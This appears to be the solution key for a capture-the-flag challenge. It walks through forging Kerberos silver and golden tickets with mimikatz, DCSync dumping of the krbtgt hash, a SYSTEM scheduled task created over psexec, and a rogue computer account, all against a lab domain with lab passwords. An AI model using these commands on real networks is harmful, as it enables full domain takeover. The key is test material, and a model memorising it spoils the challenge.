# Going for Silver Solution

## Creds

- Win10
  - prescup:tartans@1
- Win DC
  - Administrator:scotty@#1

## Steps to Complete

- Query Guest Account
  - Windows: Get-ADUser Guest -Properties Comment
  - NOTE: This might take a couple of minutes to populate. We have to grab a new copy of the hash because it could update.
- Get SID on system
  - Windows: Get-ADUser Guest
- Create Silver Ticket for CIFS
  - When creating tickets, please avoid names being used in the Active Directory you're trying to attack
    - Names like Guest and rmudge in this case
  - For Windows:
    - mimikatz.exe "kerberos::golden /domain:prescup.local /sid:S-1-5-21-764921041-1137357192-4117662831 /rc4:{$TOKYO hash from guest comments} /user:{anything} /service:cifs /target:tokyo.prescup.local /ptt"
- Access the SYSVOL share drive to get the token
  - Windows:
    - dir \\tokyo.prescup.local\SYSVOL
- Create Silver Ticket for HOST
  - When creating tickets, please avoid names being used in the Active Directory you're trying to attack
    - Names like Guest and rmudge in this case
  - For Windows:
    - mimikatz.exe "kerberos::golden /domain:prescup.local /sid:S-1-5-21-764921041-1137357192-4117662831 /rc4:{$TOKYO hash from guest comments} /user:{anything} /service:host /target:tokyo.prescup.local /ptt"
- Create the scheduled task "PresidentsCup"
  - Windows
    - To create the task, we're going to use psexec which also needs the CIFS ticket
    - To create the CIFS ticket, reference the HOST silver ticket and replace HOST with CIFS
    - then run psexec \\tokyo.prescup.local cmd.exe
    - then, schtasks /create /S tokyo.prescup.local /SC weekly /RU "NT Authority\System" /TN "PresidentsCup" /TR "notepad.exe"
- Access the SYSVOL share drive to get the token
- Create Silver Ticket for LDAP
  - When creating tickets, please avoid names being used in the Active Directory you're trying to attack
    - Names like Guest and rmudge in this case
  - For Windows:
    - mimikatz.exe "kerberos::golden /domain:prescup.local /sid:S-1-5-21-764921041-1137357192-4117662831 /rc4:{$TOKYO hash from guest comments} /user:{anything} /service:ldap /target:tokyo.prescup.local /ptt"
    - mimikatz.exe "lsadump::dcsync /domain:prescup.local /dc:tokyo.prescup.local /user:krbtgt"
    - mimikatz.exe "kerberos::golden /domain:prescup.local /sid:S-1-5-21-764921041-1137357192-4117662831 /rc4:{krbtgt hash from lsadump} /user:{anything} /ptt"
    - NOTE: This will create a golden ticket.
- Create Computer Account "Win10-Fake"
  - Windows: New-ADComputer -Name "Win10-Fake"
- Access the SYSVOL share drive to get the token
